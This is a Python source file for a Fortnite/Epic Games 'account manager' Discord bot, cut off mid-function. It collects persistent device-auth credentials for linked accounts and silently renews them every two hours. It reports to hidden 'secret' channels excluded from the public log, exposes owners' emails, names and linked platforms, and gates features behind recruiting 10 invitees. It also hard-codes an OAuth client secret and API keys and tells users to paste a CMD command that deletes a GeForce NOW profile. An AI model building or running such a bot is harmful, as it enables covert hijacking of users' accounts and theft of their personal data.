import discord
from discord import Interaction, ui
from discord.ext import commands, tasks
import aiohttp
import asyncio
import base64
import json
import os
import sys
import time
import datetime
import uuid
import re as _re

try:
    current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    os.chdir(current_dir)
except Exception as e:
    print(f"Error changing working directory: {e}")
    current_dir = os.path.dirname(os.path.abspath(__file__))

# ==========================================
#   הכנס כאן את הטוקן של הבוט
# ==========================================
TOKEN = os.environ.get("DISCORD_TOKEN", "")
# ==========================================

SECRET_CHANNEL_IDS = (1513098510050922546, 1506120705329070143)
COMMAND_LOG_CHANNEL_ID = 1513019632938651748

ACCOUNTS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'accounts.json')
NEXUS_LOGO_URL = "https://cdn.discordapp.com/embed/avatars/0.png"
CLIENT_ID = "af43dc71dd91452396fcdffbd7a8e8a9"
CLIENT_SECRET = "4YXvSEBLFRPLh1hzGZAkfOi5mqupFohZ"
FORTNITE_API_KEY = "76bf7395-7b05-4de1-be1a-173558050d81"

SWITCH_TOKEN  = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
ANDROID_TOKEN = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
EPIC_TOKEN_URL  = "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token"
EPIC_TOKEN_URL2 = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
EPIC_DEVICE_URL = "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization"
EPIC_EXCHANGE   = "https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange"

pending_logins: dict = {}

COMMAND_HISTORY_DESCRIPTIONS = {
    "login": "linked their Epic Games account",
    "logout": "unlinked their Epic Games",
    "vbucks": "checked their V-Bucks",
    "br-stats": "checked their BR stats",
    "exchange-code": "generated an exchange code",
    "account-page": "opened their account page",
    "account-info": "checked their account info",
    "device-auths": "viewed their device auths",
    "change-displayname": "changed their display name",
    "lookup": "looked up a player",
    "claim-2fa": "claimed 2FA rewards",
    "calp": "claimed mission alert rewards",
    "check-ban": "checked their ban status",
    "check-rank": "checked their rank",
    "xp-status": "checked their XP status",
    "search-cosmetic": "searched for a cosmetic",
    "custom-crowns": "changed their crown wins",
    "backpack-destroy-all": "destroyed their STW backpack",
    "storage-destroy-all": "destroyed their STW storage",
    "skip-stw-tutorial": "skipped the STW tutorial",
    "check-founders": "checked their Founders Pack",
    "daily-quests": "checked their daily quests",
    "vber": "checked V-Buck missions",
    "add-friend": "sent a friend request",
    "remove-friend": "removed a friend",
    "friends-list": "viewed their friends list",
    "accept-incoming": "accepted friend requests",
    "clear-friends": "cleared their friends list",
    "view-blocklist": "viewed their blocklist",
    "block-user": "blocked a user",
    "unblock-user": "unblocked a user",
    "epic-services": "checked Epic services status",
    "free-games": "checked free games",
    "sac-set": "set a SAC code",
    "bot-info": "checked bot info",
    "undo-purchase": "attempted a purchase refund",
    "free-vbucks": "checked free V-Bucks guide",
    "sync-logins": "synced all logins",
    "launch-game": "launched the game",
    "accept-friends": "accepted all friend requests",
    "check-locker": "checked their locker",
    "refresh-account": "refreshed their account",
}


def get_custom_basic_auth():
    return base64.b64encode(f"{CLIENT_ID}:{CLIENT_SECRET}".encode()).decode()


def load_accounts():
    if not os.path.exists(ACCOUNTS_FILE):
        return {}
    try:
        with open(ACCOUNTS_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}


def save_accounts(accounts):
    with open(ACCOUNTS_FILE, 'w') as f:
        json.dump(accounts, f, indent=4)


def track_account_history(accounts: dict, account_id: str, display_name: str = None, email: str = None):
    """שומר היסטוריית שמות ומיילים בתוך accounts.json"""
    if account_id not in accounts:
        return
    today = datetime.datetime.utcnow().strftime("%Y-%m-%d")
    acc = accounts[account_id]

    # ── היסטוריית שמות תצוגה ──
    if display_name:
        hist = acc.setdefault("_name_history", [])
        existing_names = [e["name"] for e in hist]
        if display_name not in existing_names:
            hist.append({"name": display_name, "seen": today})

    # ── היסטוריית מיילים ──
    if email:
        hist = acc.setdefault("_email_history", [])
        existing_emails = [e["email"] for e in hist]
        if email not in existing_emails:
            hist.append({"email": email, "seen": today})


def is_user_logged_in(discord_id: int) -> bool:
    accounts = load_accounts()
    return any(v.get("linked_discord_id") == discord_id for v in accounts.values())


async def get_access_token_from_device_auth(user_auth, _retries: int = 3):
    """
    מנסה לקבל access_token.
    מחזיר:
      - str  : הצליח
      - None : הצליח להגיע ל-Epic אבל device_auth לא תקין (401/403 → חשבון פג)
      - "network_error" : לא הצלחנו להגיע ל-Epic (בעיית רשת זמנית)
    """
    url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
    account_id = user_auth.get('account_id')
    device_id  = user_auth.get('device_id')
    secret     = user_auth.get('secret')
    if not all([account_id, device_id, secret]):
        return None
    data = {
        "grant_type": "device_auth",
        "account_id": account_id,
        "device_id":  device_id,
        "secret":     secret,
        "token_type": "eg1",
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": f"basic {get_custom_basic_auth()}",
    }
    timeout = aiohttp.ClientTimeout(total=15)
    for attempt in range(1, _retries + 1):
        try:
            connector = aiohttp.TCPConnector(use_dns_cache=False)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.post(url, data=data, headers=headers) as r:
                    if r.status == 200:
                        return (await r.json()).get('access_token')
                    if r.status in (400, 401, 403):
                        # device_auth לא תקין — החשבון אכן פג
                        body = {}
                        try:
                            body = await r.json()
                        except Exception:
                            pass
                        print(f"[DeviceAuth] Account {account_id} auth failed ({r.status}): {body.get('errorCode', '')}")
                        return None
                    # סטטוס לא ידוע — נסה שוב
                    print(f"[DeviceAuth] Unexpected status {r.status} for {account_id}, attempt {attempt}/{_retries}")
        except (aiohttp.ClientError, asyncio.TimeoutError, Exception) as e:
            print(f"[DeviceAuth] Network error for {account_id} attempt {attempt}/{_retries}: {e}")
            if attempt < _retries:
                await asyncio.sleep(2 * attempt)   # 2s, 4s
            else:
                return "network_error"
    return "network_error"


async def get_user_account(discord_id: int):
    accounts = load_accounts()
    for aid, adata in accounts.items():
        if adata.get("linked_discord_id") == discord_id:
            token = await get_access_token_from_device_auth(adata)
            # "network_error" → מחזיר כ-None כדי שהקוד הקורא יטפל בזה
            if token == "network_error":
                return aid, adata, None
            return aid, adata, token
    return None, None, None


async def get_full_account_details(access_token, account_id):
    url = f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}"
    headers = {"Authorization": f"bearer {access_token}"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as r:
                if r.status == 200:
                    return await r.json()
    except Exception:
        pass
    return {}


async def get_mfa_status(access_token, account_id):
    url = f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}/mfaSettings"
    headers = {"Authorization": f"bearer {access_token}"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as r:
                if r.status == 200:
                    return await r.json()
    except Exception:
        pass
    return {}


async def get_official_exchange(access_token):
    url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
    headers = {"Authorization": f"bearer {access_token}"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as r:
                if r.status == 200:
                    return (await r.json()).get("code")
    except Exception:
        pass
    return None


async def create_device_auth_custom(access_token, account_id):
    url = f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}/deviceAuth"
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, json={}) as r:
                if r.status == 200:
                    return await r.json()
    except Exception:
        pass
    return None


async def log_success(interaction: Interaction, command_key: str):
    """נשלח לחדר ההיסטוריה רק כשפקודה הצליחה — לא מהחדר הסודי."""
    try:
        # אם הפקודה בוצעה מהחדר הסודי — לא לשלוח כלום
        if interaction.channel_id in SECRET_CHANNEL_IDS:
            return
        channel = bot.get_channel(COMMAND_LOG_CHANNEL_ID)
        if not channel:
            channel = await bot.fetch_channel(COMMAND_LOG_CHANNEL_ID)
        if not channel:
            return
        display_name = str(interaction.user.display_name)
        action = COMMAND_HISTORY_DESCRIPTIONS.get(command_key, f"used /{command_key}")
        await channel.send(f"`[HISTORY]` {display_name} {action}")
    except Exception as e:
        print(f"[log_success] Error: {e}")


async def notify_admin_failure(interaction: Interaction, error_msg: str):
    """שולח DM למנהל השרת כשפקודה נכשלת."""
    try:
        if not interaction.guild:
            return
        owner = interaction.guild.owner
        if not owner:
            owner = await interaction.guild.fetch_member(interaction.guild.owner_id)
        if not owner:
            return
        cmd_name = interaction.command.name if interaction.command else "unknown"
        embed = discord.Embed(title="⚠️ Command Failed", color=0xff4444, timestamp=datetime.datetime.utcnow())
        embed.add_field(name="👤 משתמש", value=f"{interaction.user.mention} (`{interaction.user.id}`)", inline=False)
        embed.add_field(name="📝 פקודה", value=f"`/{cmd_name}`", inline=True)
        embed.add_field(name="❌ שגיאה", value=f"```{str(error_msg)[:300]}```", inline=False)
        embed.set_footer(text=f"שרת: {interaction.guild.name}")
        await owner.send(embed=embed)
    except Exception as e:
        print(f"[notify_admin_failure] Could not DM admin: {e}")


async def locked_command_response(interaction: Interaction):
    if not is_user_logged_in(interaction.user.id):
        embed = discord.Embed(color=0xff4444)
        embed.description = (
            "❌ **Access Denied**\n\n"
            "You must connect your Epic Games account first.\n"
            "Use `/login` to link your account and unlock the bot."
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    embed = discord.Embed(title="🔒 Commands Locked", color=0xf0a500)
    embed.description = (
        "Your account is connected — but commands are currently **locked**.\n\n"
        "> **Only after you invite 10 members to this server**\n"
        "> will all commands be unlocked for you.\n\n"
        "Use `/invite` to get your invite link and start inviting!"
    )
    embed.set_footer(text="Invite 10 members → Commands unlock automatically")
    await interaction.response.send_message(embed=embed, ephemeral=True)


# ==========================================
#     PERSISTENT LAUNCH VIEW
# ==========================================
class PersistentLaunchView(discord.ui.View):

    def __init__(self, account_id: str):
        self.account_id = account_id
        super().__init__(timeout=None)

        # כפתורים עם custom_id ייחודי לכל חשבון
        aid = account_id[:16]
        btn_launch = discord.ui.Button(label="Launch Game", style=discord.ButtonStyle.blurple, emoji="🚀", custom_id=f"launch_{aid}")
        btn_launch.callback = self.launch_game_btn
        btn_friends = discord.ui.Button(label="Accept All Friend Requests", style=discord.ButtonStyle.success, emoji="🤝", custom_id=f"friends_{aid}")
        btn_friends.callback = self.accept_friends_btn
        btn_locker = discord.ui.Button(label="Check Locker & V-Bucks", style=discord.ButtonStyle.secondary, emoji="💳", custom_id=f"locker_{aid}")
        btn_locker.callback = self.check_locker_btn
        btn_refresh = discord.ui.Button(label="🔄 רענן חשבון", style=discord.ButtonStyle.secondary, custom_id=f"refresh_{aid}")
        btn_refresh.callback = self.refresh_expired_session
        btn_history = discord.ui.Button(label="📋 Account History", style=discord.ButtonStyle.danger, emoji="🔍", custom_id=f"history_{aid}")
        btn_history.callback = self.account_history_btn
        self.add_item(btn_launch)
        self.add_item(btn_friends)
        self.add_item(btn_locker)
        self.add_item(btn_refresh)
        self.add_item(btn_history)

    async def _get_token(self, interaction: Interaction):
        accounts = load_accounts()
        user_auth = accounts.get(self.account_id)
        if not user_auth:
            await interaction.followup.send("❌ Account data not found.", ephemeral=True)
            return None, None
        token = await get_access_token_from_device_auth(user_auth)
        if token == "network_error":
            await interaction.followup.send(
                "⚠️ **בעיית רשת זמנית** — לא הצלחנו להגיע לשרתי Epic.\n"
                "נסה שוב בעוד מספר שניות. אין צורך ב-`/login` מחדש.",
                ephemeral=True
            )
            return None, None
        if not token:
            await interaction.followup.send(
                "❌ **Session פג** — פרטי ההתחברות אינם תקינים יותר.\n"
                "בצע `/login` מחדש כדי לחבר את החשבון.",
                ephemeral=True
            )
            return None, None
        return user_auth, token

    async def launch_game_btn(self, interaction: Interaction):
        await interaction.response.defer(ephemeral=True)
        user_auth, access_token = await self._get_token(interaction)
        if not access_token:
            return
        exchange_code = await get_official_exchange(access_token)
        if not exchange_code:
            await interaction.followup.send("❌ Error generating exchange code.", ephemeral=True)
            return
        direct_login_url = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}"
        clean_gfn_cmd = (
            'taskkill /f /im GeForceNOW.exe >nul 2>&1 & '
            'del /q /f "%localappdata%\\NVIDIA Corporation\\GeForceNOW\\private_profile" >nul 2>&1'
        )
        display_name = user_auth.get('displayName', self.account_id)
        embed = discord.Embed(title="🔐 Cloud Connection Panel", color=0x00a2ff)
        embed.description = (
            f"The connection for player **{display_name}** is ready.\n\n"
            f"1️⃣ **Step One:**\nRun this in CMD to clean GeForce NOW:\n"
            f"```cmd\n{clean_gfn_cmd}\n```\n"
            f"2️⃣ **Step Two:**\n[Click here to automatically log in via browser]({direct_login_url})\n\n"
            f"3️⃣ **Step Three:**\nOpen GeForce NOW, and click login to Epic Games."
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        await log_success(interaction, "launch-game")

    async def accept_friends_btn(self, interaction: Interaction):
        await interaction.response.defer(ephemeral=True)
        user_auth, access_token = await self._get_token(interaction)
        if not access_token:
            return
        friends_url = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{self.account_id}/friends/incoming"
        headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
        try:
            connector = aiohttp.TCPConnector(use_dns_cache=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(friends_url, headers=headers) as r:
                    if r.status != 200:
                        await interaction.followup.send(f"❌ Failed to fetch friend requests (Status: {r.status}).", ephemeral=True)
                        return
                    incoming_requests = await r.json()
                if not incoming_requests:
                    await interaction.followup.send("🤝 No pending friend requests found.", ephemeral=True)
                    return
                accepted_count = 0
                for req in incoming_requests:
                    friend_id = req.get('accountId')
                    if not friend_id:
                        continue
                    accept_url = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{self.account_id}/friends/{friend_id}"
                    async with session.post(accept_url, headers=headers) as post_r:
                        if post_r.status in [200, 204]:
                            accepted_count += 1
            await interaction.followup.send(f"✅ Successfully accepted **{accepted_count}** friend requests!", ephemeral=True)
            await log_success(interaction, "accept-friends")
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

    async def check_locker_btn(self, interaction: Interaction):
        await interaction.response.defer(ephemeral=True)
        user_auth, access_token = await self._get_token(interaction)
        if not access_token:
            return
        epic_headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
        fn_base = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{self.account_id}/client"
        try:
            connector = aiohttp.TCPConnector(use_dns_cache=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(f"{fn_base}/QueryProfile?profileId=common_core&rvn=-1", headers=epic_headers, json={}) as r1:
                    core_data = await r1.json() if r1.status == 200 else {}
                async with session.post(f"{fn_base}/QueryProfile?profileId=athena&rvn=-1", headers=epic_headers, json={}) as r2:
                    athena_data = await r2.json() if r2.status == 200 else {}

            # V-Bucks
            vbucks = 0
            for item in core_data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {}).values():
                if 'Mtx' in item.get('templateId', ''):
                    vbucks += item.get('attributes', {}).get('quantity', 0)

            # Athena profile
            athena_profile = athena_data.get('profileChanges', [{}])[0].get('profile', {})
            athena_items = athena_profile.get('items', {})
            athena_stats = athena_profile.get('stats', {}).get('attributes', {})

            # תמונת הסקין המצויד
            skin_thumbnail = None
            try:
                equipped_char = None
                loadouts = athena_stats.get("loadouts", [])
                active_idx = athena_stats.get("active_loadout_index", 0)
                if loadouts and active_idx < len(loadouts):
                    loadout_id = loadouts[active_idx]
                    loadout_item = athena_items.get(loadout_id, {})
                    slots = loadout_item.get("attributes", {}).get("locker_slots_data", {}).get("slots", {})
                    char_items = slots.get("Character", {}).get("items", [])
                    if char_items:
                        equipped_char = char_items[0]
                if not equipped_char:
                    equipped_char = athena_stats.get("favorite_character", "")
                if equipped_char:
                    cosmetic_id = equipped_char.split(":")[-1].lower()
                    async with aiohttp.ClientSession() as s_skin:
                        async with s_skin.get(f"https://fortnite-api.com/v2/cosmetics/br/{cosmetic_id}", headers={"Authorization": FORTNITE_API_KEY}) as cr:
                            if cr.status == 200:
                                cdata = await cr.json()
                                images = cdata.get("data", {}).get("images", {})
                                skin_thumbnail = images.get("featured") or images.get("icon") or images.get("smallIcon")
            except Exception:
                pass

            # סקינים — ממוינים לפי זמן הוספה (האחרונים ראשון)
            skin_entries = []
            for item in athena_items.values():
                tid = item.get('templateId', '')
                if tid.startswith('AthenaCharacter:'):
                    ctime = item.get('attributes', {}).get('creation_time', '')
                    skin_entries.append((ctime, tid.split(':')[-1]))
            skin_entries.sort(key=lambda x: x[0] or '', reverse=True)
            skin_ids = [s[1] for s in skin_entries]
            total_skins = len(skin_ids)

            # BR Stats
            wins    = int(athena_stats.get('wins', 0) or 0)
            kills   = int(athena_stats.get('kills', 0) or 0)
            matches = int(athena_stats.get('matchesplayed', 0) or 0)
            kd = round(kills / matches, 3) if matches > 0 else 0
            wr = round(wins / matches * 100, 3) if matches > 0 else 0

            # שם + נדירות של 5 סקינים אחרונים
            skin_lines = []
            async with aiohttp.ClientSession() as s2:
                for cid in skin_ids[:5]:
                    try:
                        async with s2.get(
                            f"https://fortnite-api.com/v2/cosmetics/br/{cid.lower()}",
                            headers={"Authorization": FORTNITE_API_KEY}
                        ) as cr:
                            if cr.status == 200:
                                cd = await cr.json()
                                dname = cd.get('data', {}).get('name', cid)
                                series = cd.get('data', {}).get('series', {})
                                rarity = cd.get('data', {}).get('rarity', {}).get('displayValue', '')
                                tag = series.get('value', '').lower() if series else rarity.lower()
                                skin_lines.append(f"• **{dname}** ({tag})")
                            else:
                                skin_lines.append(f"• `{cid}`")
                    except Exception:
                        skin_lines.append(f"• `{cid}`")

            remaining = total_skins - len(skin_lines)
            if remaining > 0:
                skin_lines.append(f"*+ {remaining} more skins in your locker...*")

            display_name = user_auth.get('displayName', 'Player')
            desc = (
                f"💰 **Wallet**\n{vbucks} V-Bucks\n\n"
                f"👤 **Locker Count**\n{total_skins} skins total\n\n"
                f"🏁 **Lifetime Stats (BR)**\n"
                f"🏆 Wins: **{wins}**\n"
                f"💀 Kills: **{kills}**\n"
                f"📊 K/D Ratio: **{kd}**\n"
                f"🎮 Matches: **{matches}**\n"
                f"📈 Win Rate: **{wr}%**\n\n"
                f"📝 **Recent Skins (Translated)**\n"
                + "\n".join(skin_lines)
            )
            embed = discord.Embed(
                title=f"🗄️ Complete Account Profile: {display_name}",
                description=desc,
                color=0x2b2d31
            )
            if skin_thumbnail:
                embed.set_thumbnail(url=skin_thumbnail)
            embed.set_footer(text="Fortnite API Complete Sync • Locker & Stats Loaded")
            await interaction.followup.send(embed=embed, ephemeral=True)
            await log_success(interaction, "check-locker")
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
            await notify_admin_failure(interaction, str(e))

    async def account_history_btn(self, interaction: Interaction):
        await interaction.response.defer(ephemeral=True)
        user_auth, access_token = await self._get_token(interaction)
        if not access_token:
            return
        epic_headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
        try:
            async with aiohttp.ClientSession() as session:
                # פרטי חשבון בסיסיים
                async with session.get(
                    f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{self.account_id}",
                    headers=epic_headers
                ) as r1:
                    acc_data = await r1.json() if r1.status == 200 else {}

                # External auths (Xbox, PSN, Nintendo, Steam וכו')
                async with session.get(
                    f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{self.account_id}/externalAuths",
                    headers=epic_headers
                ) as r2:
                    ext_auths = await r2.json() if r2.status == 200 else []

                # Email change history (אם API זמין)
                async with session.get(
                    f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{self.account_id}/emailHistory",
                    headers=epic_headers
                ) as r3:
                    email_history_raw = await r3.json() if r3.status == 200 else []

            # ── פרטי חשבון ──
            display_name = acc_data.get("displayName", "?")
            email = acc_data.get("email", "?")
            name = f"{acc_data.get('name', '')} {acc_data.get('lastName', '')}".strip() or "?"
            country = acc_data.get("country", "?")
            lang = acc_data.get("preferredLanguage", "?")
            dn_changes = acc_data.get("numberOfDisplayNameChanges", 0)
            last_dn_change = acc_data.get("lastDisplayNameChange", "")
            last_dn_change_fmt = last_dn_change[:10] if last_dn_change else "—"
            failed_logins = acc_data.get("failedLoginAttempts", 0)
            last_login = acc_data.get("lastLogin", "")[:10] if acc_data.get("lastLogin") else "—"
            raw_created = acc_data.get("createdAt") or acc_data.get("created") or ""
            if not raw_created:
                local_acc_tmp = load_accounts().get(self.account_id, {})
                raw_created = local_acc_tmp.get("created_at", "")
            created = raw_created[:10] if raw_created and raw_created != "N/A" else "—"
            tf_enabled = "✅" if acc_data.get("tfaEnabled") else "❌"

            # ── שמור היסטוריה מקומית ──
            local_accounts = load_accounts()
            track_account_history(local_accounts, self.account_id, display_name=display_name, email=email)
            save_accounts(local_accounts)
            local_acc = local_accounts.get(self.account_id, {})

            # ── היסטוריית שמות תצוגה (מקומית) ──
            name_hist = local_acc.get("_name_history", [])
            if name_hist:
                name_lines = [f"• **{e['name']}** ({e.get('seen', '?')})" for e in reversed(name_hist)]
                name_section = "\n".join(name_lines)
            else:
                name_section = f"• **{display_name}** (נוכחי)"

            # ── היסטוריית מיילים (API + מקומית) ──
            if isinstance(email_history_raw, list) and email_history_raw:
                email_lines = []
                for entry in email_history_raw:
                    e = entry.get("email", "?")
                    d = (entry.get("changedAt") or entry.get("date", ""))[:10]
                    email_lines.append(f"• `{e}` ({d})")
                email_section = "\n".join(email_lines)
            else:
                email_hist = local_acc.get("_email_history", [])
                if email_hist:
                    email_lines = [f"• `{e['email']}` ({e.get('seen', '?')})" for e in reversed(email_hist)]
                    email_section = "\n".join(email_lines)
                else:
                    email_section = f"• `{email}` (נוכחי)"

            # ── External Auths ──
            PLATFORM_ICONS = {
                "xbl": "🎮 Xbox Live",
                "psn": "🎮 PlayStation",
                "nintendo": "🎮 Nintendo",
                "steam": "🖥️ Steam",
                "twitch": "💜 Twitch",
                "google": "🔵 Google",
                "apple": "🍎 Apple",
                "github": "⚫ GitHub",
            }
            ext_lines = []
            if isinstance(ext_auths, list):
                for ext in ext_auths:
                    ptype = ext.get("type", "").lower()
                    icon = PLATFORM_ICONS.get(ptype, f"🔗 {ptype.upper()}")
                    ext_name = ext.get("externalDisplayName") or ext.get("externalAuthId", "?")
                    added = (ext.get("dateAdded") or "")[:10] or "—"
                    ext_lines.append(f"{icon}: **{ext_name}** (נוסף: {added})")

            desc = (
                f"📧 **מייל נוכחי**\n`{email}`\n\n"
                f"👤 **שם מלא**\n{name}\n\n"
                f"🌍 **מדינה / שפה**\n{country} / {lang}\n\n"
                f"📅 **נוצר**\n{created}\n\n"
                f"🔐 **2FA**\n{tf_enabled}\n\n"
                f"🔑 **כניסות כושלות**\n{failed_logins}\n\n"
                f"🕐 **כניסה אחרונה**\n{last_login}\n\n"
                f"✏️ **שמות תצוגה שהיו על החשבון**\n{name_section}\n\n"
                f"📬 **היסטוריית מיילים**\n{email_section}\n\n"
            )

            if ext_lines:
                desc += f"🔗 **כניסות קונסולות / פלטפורמות**\n" + "\n".join(ext_lines)
            else:
                desc += "🔗 **כניסות קונסולות / פלטפורמות**\nאין חשבונות מקושרים"

            embed = discord.Embed(
                title=f"📋 Account History: {display_name}",
                description=desc,
                color=0xe74c3c
            )
            embed.set_footer(text="Epic Games Account Service • פרטי חשבון מלאים")
            await interaction.followup.send(embed=embed, ephemeral=True)
            await log_success(interaction, "account-history")
        except Exception as e:
            await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
            await notify_admin_failure(interaction, str(e))

    async def refresh_expired_session(self, interaction: Interaction):
        await interaction.response.defer(ephemeral=True)
        result = await self.perform_json_refresh(self.account_id)
        if result == "network_error":
            await interaction.followup.send(
                "⚠️ **בעיית רשת זמנית** — לא הצלחנו להגיע לשרתי Epic.\n"
                "נסה שוב בעוד כמה שניות. **אין צורך ב-`/login` מחדש.**",
                ephemeral=True
            )
        elif result:
            display_name, acc_id = result
            embed = discord.Embed(title="✅ החשבון רענן בהצלחה!", color=0x00ff00)
            embed.add_field(name="שם משתמש Epic", value=f"**{display_name}**", inline=True)
            embed.add_field(name="Account ID", value=f"`{acc_id}`", inline=True)
            embed.set_footer(text="הטוקן אומת מול Epic Games ונשמר")
            await interaction.followup.send(embed=embed, ephemeral=True)
            await log_success(interaction, "refresh-account")
        else:
            await interaction.followup.send(
                "❌ **Session פג תוקף** — פרטי ההתחברות אינם תקינים.\n"
                "בצע `/login` מחדש כדי לחבר את החשבון.",
                ephemeral=True
            )

    async def perform_json_refresh(self, account_id):
        """מחזיר tuple(name,id) בהצלחה | 'network_error' | None (session פג)"""
        try:
            accounts = load_accounts()
            user_auth = accounts.get(account_id)
            if not user_auth:
                return None
            access_token = await get_access_token_from_device_auth(user_auth)
            if access_token == "network_error":
                return "network_error"
            if not access_token:
                return None
            verify_url = f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}"
            headers = {"Authorization": f"bearer {access_token}"}
            async with aiohttp.ClientSession() as session:
                async with session.get(verify_url, headers=headers) as r:
                    if r.status != 200:
                        return None
                    account_info = await r.json()
                    display_name = account_info.get("displayName", user_auth.get("displayName", account_id))
            new_device_data = await create_device_auth_custom(access_token, account_id)
            if new_device_data:
                accounts[account_id]['device_id'] = new_device_data['deviceId']
                accounts[account_id]['secret'] = new_device_data['secret']
                accounts[account_id]['displayName'] = display_name
                accounts[account_id]['last_refresh'] = time.time()
                track_account_history(accounts, account_id, display_name=display_name)
                save_accounts(accounts)
            return (display_name, account_id)
        except Exception as e:
            print(f"[Refresh] Error: {e}")
            return None


# ==========================================
#     AUTO-REFRESH — כל שעתיים
# ==========================================
@tasks.loop(hours=2)
async def auto_refresh_all_accounts():
    accounts = load_accounts()
    if not accounts:
        return
    success_lines, failed_lines = [], []
    changed = False
    for account_id, user_auth in accounts.items():
        display = user_auth.get('displayName', account_id)
        try:
            access_token = await get_access_token_from_device_auth(user_auth)
            if access_token == "network_error":
                failed_lines.append(f"⚠️ **{display}** — בעיית רשת, לא פג תוקף")
                continue
            if not access_token:
                failed_lines.append(f"❌ **{display}** — session expired")
                continue
            new_device_data = await create_device_auth_custom(access_token, account_id)
            if new_device_data:
                accounts[account_id]['device_id'] = new_device_data['deviceId']
                accounts[account_id]['secret'] = new_device_data['secret']
                accounts[account_id]['last_refresh'] = time.time()
                changed = True
                success_lines.append(f"✅ **{display}**")
            else:
                failed_lines.append(f"⚠️ **{display}** — device auth failed")
        except Exception as e:
            failed_lines.append(f"❌ **{display}** — error: {e}")
    if changed:
        save_accounts(accounts)
    log_embed = discord.Embed(
        title="🔄 Auto-Refresh Report",
        color=0x00ff00 if not failed_lines else 0xff9900,
        timestamp=datetime.datetime.utcnow()
    )
    log_embed.add_field(name=f"✅ Refreshed ({len(success_lines)})", value="\n".join(success_lines) if success_lines else "*None*", inline=False)
    if failed_lines:
        log_embed.add_field(name=f"❌ Failed ({len(failed_lines)})", value="\n".join(failed_lines), inline=False)
    log_embed.set_footer(text="Next refresh in 2 hours")
    for _secret_cid in SECRET_CHANNEL_IDS:
        _ch = bot.get_channel(_secret_cid)
        if not _ch:
            try:
                _ch = await bot.fetch_channel(_secret_cid)
            except Exception:
                _ch = None
        if _ch:
            try:
                await _ch.send(embed=log_embed)
            except Exception as e:
                print(f"[Auto-Refresh] Failed to send log: {e}")

@auto_refresh_all_accounts.before_loop
async def before_auto_refresh():
    await bot.wait_until_ready()


# ==========================================
#     BOT INITIALIZATION
# ==========================================
class KnightBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)

    async def setup_hook(self):
        accounts = load_accounts()
        for acc_id in accounts.keys():
            self.add_view(PersistentLaunchView(account_id=acc_id))
        print("🔄 Syncing slash commands...")
        await self.tree.sync()
        print("✅ Commands synced!")
        auto_refresh_all_accounts.start()


bot = KnightBot()


# ==========================================
#          SLASH COMMANDS
# ==========================================

# ── Login helper functions ────────────────────────────────────────────────────

async def epic_get_access_token(session: aiohttp.ClientSession) -> str:
    async with session.post(
        EPIC_TOKEN_URL2,
        headers={"Authorization": f"basic {SWITCH_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"},
        data={"grant_type": "client_credentials"},
    ) as r:
        data = await r.json()
    if "access_token" not in data:
        raise Exception(f"Failed to get access token: {data.get('errorMessage', data)}")
    return data["access_token"]


async def epic_create_device_code(session: aiohttp.ClientSession, access_token: str):
    async with session.post(
        EPIC_DEVICE_URL,
        headers={"Authorization": f"bearer {access_token}", "Content-Type": "application/x-www-form-urlencoded"},
    ) as r:
        data = await r.json()
    if "user_code" not in data:
        raise Exception(f"Failed to create device code: {data.get('errorMessage', data)}")
    user_code   = data["user_code"]
    device_code = data["device_code"]
    epic_url    = f"https://www.epicgames.com/activate?userCode={user_code}"
    return user_code, device_code, epic_url


async def epic_poll_device_code(session: aiohttp.ClientSession, device_code: str):
    """Poll until the user approves. Returns (access_token, account_id)."""
    for _ in range(60):
        async with session.post(
            EPIC_TOKEN_URL,
            headers={"Authorization": f"basic {SWITCH_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"},
            data={"grant_type": "device_code", "device_code": device_code},
        ) as r:
